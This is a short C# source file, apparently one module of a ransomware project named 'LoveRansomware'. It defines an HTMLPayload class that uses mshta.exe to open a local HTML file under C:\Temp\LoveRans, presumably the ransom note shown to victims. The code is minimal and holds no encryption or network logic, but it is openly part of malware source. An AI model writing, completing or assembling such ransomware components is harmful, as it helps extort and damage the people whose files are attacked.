using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace LoveRansomware.Rans.HTMLPayload
{
    class HTMLPayload
    {
        public void ShowHTMLFile()
        {
            string html = @"C:\Temp\LoveRans\index.html";
            Process.Start("mshta", html);
        }
    }
}
